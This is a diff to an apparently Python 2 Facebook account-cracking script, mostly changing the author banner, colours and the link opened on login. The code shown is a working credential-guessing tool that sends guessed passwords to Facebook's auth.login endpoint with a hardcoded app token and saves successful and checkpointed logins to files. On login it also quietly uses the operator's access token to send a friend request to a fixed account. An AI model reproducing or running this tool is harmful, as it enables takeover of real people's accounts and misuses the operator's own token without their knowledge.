@@ -43,12 +43,12 @@ THE R.H.P 1.0286
    MARKZUKERBURG KA PAPA
 
  
-\033[1;91m=======================================
+\033[1;39m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mARBAB-ALI-MEMON
-\033[1;96mYouTube \033[1;93m: \033[1;92mCYBER GANGE HIDDEN TRICKER
-\033[1;96mContact  \033[1;93m: \033[1;92m+923003023263
-\033[1;96mInfo \033[1;93m: \033[1;92mCYBER-HACKER
-\033[1;91m======================================="""
+\033[1;96mYouTube \033[1;93m: \033[1;93mCYBER GANGE HIDDEN TRICKER
+\033[1;96mContact  \033[1;93m: \033[1;94m+923003023263
+\033[1;96mInfo \033[1;93m: \033[1;95mCYBER-HACKER
+\033[1;39m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -83,10 +83,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 def login():
 	os.system('clear')
 	try:
@@ -125,8 +125,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				print '\n\033[1;96m\x1b[1;92mLogin Successful With Cyber Arbab'
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -172,8 +172,8 @@ def menu():
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;91m Start CLONING WITH ARBAB"
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;92m Exit(BOLE TO KALTI MARNA)"
 	pilih()
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
@@ -203,8 +203,8 @@ def super():
 	print logo
 	print 42*"\033[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;95m Crack From Any Public ID"
+	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;94m Crack From File"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
 def pilih_super():
@@ -367,11 +367,11 @@ def pilih_super():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																print '\x1b[1;96m[\x1b[1;92mHACK100%📳\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																	print '\x1b[1;96m[\x1b[1;93mCheckpoint📴\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
 																	cek = open("out/checkpoint.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
